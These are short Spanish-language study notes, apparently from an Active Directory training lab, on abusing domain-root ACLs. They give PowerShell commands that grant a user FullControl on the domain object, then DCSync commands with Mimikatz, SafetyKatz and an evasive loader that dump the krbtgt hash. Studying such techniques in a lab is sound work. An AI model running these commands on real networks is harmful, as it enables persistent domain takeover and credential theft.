# Rights Abuse using ACLs 

Tags: #AD #Windows #Powershell #ACL 

```bash 
- Existen aún más ACLs interesantes que pueden ser abusadas.
- Por ejemplo, con privilegios de 'Domain Admin (DA)', la ACL del **dominio raíz** puede modificarse para otorgar permisos útiles como 'FullControl' o la capacidad de ejecutar 'DCSync'.
```

```powershell 
! Usuario: Domain Admin

❯ Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
# Agregar permisos FullControl sobre el objeto raíz del dominio a un usuario — permite abusar de DCSync, modificar ACLs y otros ataques de persistencia.

❯ Set-ADACL -SamAccountName studentuser1 -DistinguishedName 'DC=dollarcorp,DC=moneycorp,DC=local' -Right GenericAll -Verbose
# Igual que el anterior pero usando el módulo ActiveDirectory + RACE toolkit.
```

```powershell 
! Usuario: Usuario de dominio con permisos DCSync otorgados

❯ Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
# Ejecutar DCSync para volcar el hash de krbtgt vía PowerShell usando Invoke-Mimikatz.

❯ .\SafetyKatz.exe "lsadump::dcsync /user:dcorp\krbtgt" "exit"
# Igual que el anterior pero usando SafetyKatz — alternativa evasiva para el mismo objetivo.

❯ .\Loader.exe -path C:\AD\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:dcorp\krbtgt" "exit"
```